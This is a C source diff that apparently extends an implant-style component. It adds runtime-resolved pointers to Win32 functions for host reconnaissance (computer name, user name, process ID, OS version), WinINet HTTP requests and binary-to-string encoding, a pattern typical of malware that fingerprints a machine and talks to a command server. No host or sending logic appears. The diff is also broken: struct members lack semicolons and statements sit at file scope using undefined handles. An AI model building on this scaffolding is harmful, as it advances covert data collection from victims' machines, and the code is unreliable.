@@ -41,16 +41,43 @@ struct {
 struct {
     struct {
         struct {
-            GETCOMPUTERNAMEA    GetComputerNameA;
+            GETCOMPUTERNAMEA            GetComputerNameA;
+            GETUSERNAMEA                GetUserNameA
+            GETCURRENTPROCESSID         GetCurrentProcessId
+            GETVERSION                  GetVersion
+            INTERNETOPENA               InternetOpenA
+            INTERNETCONNECTA            InternetConnectA
+            HTTPOPENREQUESTA            HttpOpenRequestA
+            HTTPADDREQUESTHEADERSA      HttpAddRequestHeadersA
+            HTTPSENDREQUESTA            HttpSendRequestA
+            INTERNETQUERYDATAAVAILABLE  InternetQueryDataAvailable
+            INTERNETREADFILE            InternetReadFile
+            INTERNETCLOSEHANDLE         InternetCloseHandle
+            CRYPTBINARYTOSTRINGA        CryptBinaryToStringA
         } call;
         struct {
-            HMODULE             kernel32;
-            HMODULE             advapi32;
-            HMODULE             crypt32;
-            HMODULE             wininet;
+            HMODULE                     kernel32;
+            HMODULE                     advapi32;
+            HMODULE                     crypt32;
+            HMODULE                     wininet;
         } module;
     } win32;
 } internal;
+
+
+GETCOMPUTERNAMEA myGetComputerNameA = (GETCOMPUTERNAMEA) GetProcAddress(hkernel32, "GetComputerNameA");
+    GETUSERNAMEA myGetUserNameA = (GETUSERNAMEA) GetProcAddress(hadvapi32, "GetUserNameA");
+    GETCURRENTPROCESSID myGetCurrentProcessId = (GETCURRENTPROCESSID) GetProcAddress(hkernel32, "GetCurrentProcessId");
+    GETVERSION myGetVersion = (GETVERSION) GetProcAddress(hkernel32, "GetVersion");
+    INTERNETOPENA myInternetOpenA = (INTERNETOPENA) GetProcAddress(hwininet, "InternetOpenA");
+    INTERNETCONNECTA myInternetConnectA = (INTERNETCONNECTA) GetProcAddress(hwininet, "InternetConnectA");
+    HTTPOPENREQUESTA myHttpOpenRequestA = (HTTPOPENREQUESTA) GetProcAddress(hwininet, "HttpOpenRequestA");
+    HTTPADDREQUESTHEADERSA myHttpAddRequestHeadersA = (HTTPADDREQUESTHEADERSA) GetProcAddress(hwininet, "HttpAddRequestHeadersA");
+    HTTPSENDREQUESTA myHttpSendRequestA = (HTTPSENDREQUESTA) GetProcAddress(hwininet, "HttpSendRequestA");
+    INTERNETQUERYDATAAVAILABLE myInternetQueryDataAvailable = (INTERNETQUERYDATAAVAILABLE) GetProcAddress(hwininet, "InternetQueryDataAvailable");
+    INTERNETREADFILE myInternetReadFile = (INTERNETREADFILE) GetProcAddress(hwininet, "InternetReadFile");
+    INTERNETCLOSEHANDLE myInternetCloseHandle = (INTERNETCLOSEHANDLE) GetProcAddress(hwininet, "InternetCloseHandle");
+    CRYPTBINARYTOSTRINGA myCryptBinaryToStringA = (CRYPTBINARYTOSTRINGA) GetProcAddress(hcrypt32, "CryptBinaryToStringA");
 
 unsigned char patch_list_name[pointer_length] = {0xAA};
 
